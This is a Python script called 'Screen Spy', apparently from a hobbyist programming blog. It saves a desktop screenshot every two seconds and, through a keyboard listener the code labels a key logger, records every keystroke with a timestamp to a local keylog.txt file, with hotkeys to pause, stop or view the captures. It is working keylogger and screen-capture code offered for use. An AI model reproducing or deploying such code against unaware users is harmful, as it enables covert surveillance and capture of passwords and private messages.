'''
   Screen Spy V1.92. Steve Shambles July 2019.
   https://stevepython.wordpress.com

pip3 install pyscreeze
pip3 install pynput
pip3 install keyboard
'''
import threading
import os
import sys
import subprocess
import logging
from datetime import datetime

import pyscreeze
import keyboard as kb
from pynput.keyboard import Listener


class glo:
    '''global store, this makes all these variables global use glo.var'''
    sys_platform = ""
    save_folder = "screens/"
    save_on = True
    stop_thread = False
    file_name = ""
    file_inc = 0
    image_count = 0
    grab_secs = 2
    max_images = 7200


def what_platform():
    '''determine system platform'''
    if sys.platform.startswith('win'):
        glo.sys_platform = 'windows'

    elif sys.platform.startswith('linux'):
        glo.sys_platform = 'linux'

    elif sys.platform.startswith('darwin'):
        glo.sys_platform = 'mac'

    else:
        sys.exit()


def chk_fold():
    '''check a save folder exists, if not create one'''
    check_folder = os.path.isdir(glo.save_folder)
    if not check_folder:
        os. mkdir(glo.save_folder)


def view_images():
    '''opens file viewer in saved image folder when Shift+Ctrl+3 pressed.'''
    if glo.sys_platform == "windows":
        cwd = glo.save_folder
        subprocess.Popen(["C:/Windows/explorer.exe", cwd.replace('/', '\\')])
        return

    # For future use, when hotkeys for linux fixed
    if glo.sys_platform == 'linux':
        subprocess.call(["xdg-open", glo.save_folder])
        return

    # mac view images would go here, if I knew how to do it.
    return


def toggle_save():
    '''Toggles save an image or not when Shift+Ctrl+1 pressed.'''
    glo.save_on = not glo.save_on


def thread_stop():
    '''Stops thread when Shift+Ctrl+2 pressed and tries to exit.'''
    glo.stop_thread = not glo.stop_thread
    sys.exit()


def check_file_exists():
    '''if about to overwrite a file create a new folder using
       a unique timestamp and use that instead'''
    check_overwrite = os.path.isfile(glo.save_folder+str(glo.file_name))
    if check_overwrite:
        time_stamp = (datetime.now().strftime(r'%y%m%d%H%M%S/'))
        new_folder = (time_stamp)
        os. mkdir(new_folder)
        glo.save_folder = new_folder


def grab_screen():
    '''Grab image of the current desktop and save to disc.'''
    glo.file_inc +=1
    glo.file_name = str(glo.file_inc)+"-screenshot.jpg"

    if glo.save_on and glo.image_count < glo.max_images:
        check_file_exists()
        pyscreeze.screenshot(glo.save_folder+str(glo.file_name))
        glo.image_count +=1

    if not glo.stop_thread:
        threading.Timer(glo.grab_secs, grab_screen).start()


def keypress(Key):
    '''key logger'''
    logging.info(str(Key))

    # had to omit hotkey use from linux version for now.
if  not sys.platform.startswith('linux'):
    hotkey_pause = "Shift+Ctrl+1"
    kb.add_hotkey(hotkey_pause, toggle_save, args=None)

    hotkey_stop = "Shift+Ctrl+2"
    kb.add_hotkey(hotkey_stop, thread_stop, args=None)

    hotkey_view = "Shift+Ctrl+3"
    kb.add_hotkey(hotkey_view, view_images, args=None)


# Start
logging.basicConfig(filename=("keylog.txt"),  \
            level=logging.DEBUG, format='%(asctime)s : %(message)s')

what_platform()
chk_fold()
grab_screen()

with Listener(on_press=keypress) as listener:
    listener.join()
